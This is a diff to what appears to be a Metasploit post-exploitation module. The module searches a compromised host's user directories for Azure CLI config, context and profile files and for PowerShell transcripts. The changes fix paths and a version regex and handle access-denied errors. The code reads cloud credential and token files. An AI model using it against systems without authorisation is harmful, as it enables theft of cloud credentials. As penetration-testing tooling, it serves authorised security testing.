@@ -85,8 +85,8 @@ class MetasploitModule < Msf::Post
     command = 'az --version'
     command = "powershell.exe #{command}" if session.platform == 'windows'
     version_output = cmd_exec(command, 60)
-    # https://rubular.com/r/wW02GJq51WDa0p
-    version_output.match(/azure-cli\s+[(]?([\d.]+)[)]?/)
+    # https://rubular.com/r/IKvnY4f15Rfujx
+    version_output.match(/azure-cli\s+\(?([\d.]+)\)?/)
   end
 
   def run
@@ -118,7 +118,7 @@ class MetasploitModule < Msf::Post
 
       # ini file content, not json.
       vprint_status('  Checking for config files')
-      %w[.Azure\config].each do |file_location|
+      %w[.azure/config].each do |file_location|
         possible_location = ::File.join(user_directory, file_location)
         next unless exists?(possible_location)
 
@@ -134,7 +134,7 @@ class MetasploitModule < Msf::Post
       end
 
       vprint_status('  Checking for context files')
-      %w[.Azure/AzureRmContext.json].each do |file_location|
+      %w[.azure/AzureRmContext.json].each do |file_location|
         possible_location = ::File.join(user_directory, file_location)
         next unless exists?(possible_location)
 
@@ -161,7 +161,7 @@ class MetasploitModule < Msf::Post
       end
 
       vprint_status('  Checking for profile files')
-      %w[.Azure/azureProfile.json].each do |file_location|
+      %w[.azure/azureProfile.json].each do |file_location|
         possible_location = ::File.join(user_directory, file_location)
         next unless exists?(possible_location)
 
@@ -216,7 +216,15 @@ class MetasploitModule < Msf::Post
 
       # https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript?view=powershell-7.4#description
       vprint_status('  Checking for powershell transcript files')
-      dir("#{user_directory}/Documents").each do |file_name|
+
+      # Post failed: Rex::Post::Meterpreter::RequestError stdapi_fs_ls: Operation failed: Access is denied.
+      begin
+        files = dir("#{user_directory}/Documents")
+      rescue Rex::Post::Meterpreter::RequestError
+        files = []
+      end
+
+      files.each do |file_name|
         next unless file_name =~ /PowerShell_transcript\.[\w_]+\.[^.]+\.\d+\.txt/
 
         possible_location = "#{user_directory}/Documents/#{file_name}"
